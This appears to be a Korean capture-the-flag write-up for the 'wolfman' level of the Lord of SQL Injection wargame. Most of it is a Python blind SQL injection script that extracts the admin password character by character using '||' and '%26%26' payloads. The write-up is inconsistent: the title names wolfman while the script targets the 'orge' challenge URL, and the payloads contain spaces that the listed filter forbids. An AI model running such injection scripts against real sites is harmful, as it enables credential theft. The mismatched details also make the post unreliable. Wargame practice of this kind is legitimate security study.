---
title: "[LOS] wolfman"
date: 2025-03-26 00:00:00
categories: [Wargame, Lord of SQL Injection]
tags: [webhacking, sqli]
published: True
---

# Query

```sql
select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'
```

<br>

# Protection

## preg_match

- `prob` 문자열
- `_`
- `.`
- `()`
- ` ` (white space)

<br>

## addslashes()

```php
$_GET[pw] = addslashes($_GET[pw]);
```

<br>

# Analysis

- [orc](https://1unaram.github.io/posts/los-orc/) 문제와 같이 blind sql injection이 가능
- `or` 대신 `||` 연산자를 사용하고, `and` 대신 `&&`를 사용해야하나 `&`를 query string으로 인식하기에 인코딩하여 `%26`으로 사용

<br>

# Exploit code

```python
import requests

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
cookie = '39je4ges6g212tfsms39bnhqk5'

# Get the length of the password
length = 1
while True:
    payload = f"?pw=' || id='admin' %26%26 length(pw)={length} %23 "

    res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})

    if '<h2>Hello admin</h2>' in res.text:
        break

    length += 1

print(f'*** Found length: {length} ***')

# Get the password by binary search
password = ''
for i in range(1, length + 1):

    low = ord('0')
    high = ord('z')
    while low <= high:
        mid = (low + high) // 2
        payload = f"?pw=' || id='admin' %26%26 ascii(substring(pw,{i},1))<={mid} %23 "
        res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})

        if '<h2>Hello admin</h2>' in res.text:
            high = mid - 1
        else:
            low = mid + 1
    password += chr(low)
    print(f'Current password: {password}')

print(f'*** Found Password: {password} ***')
```
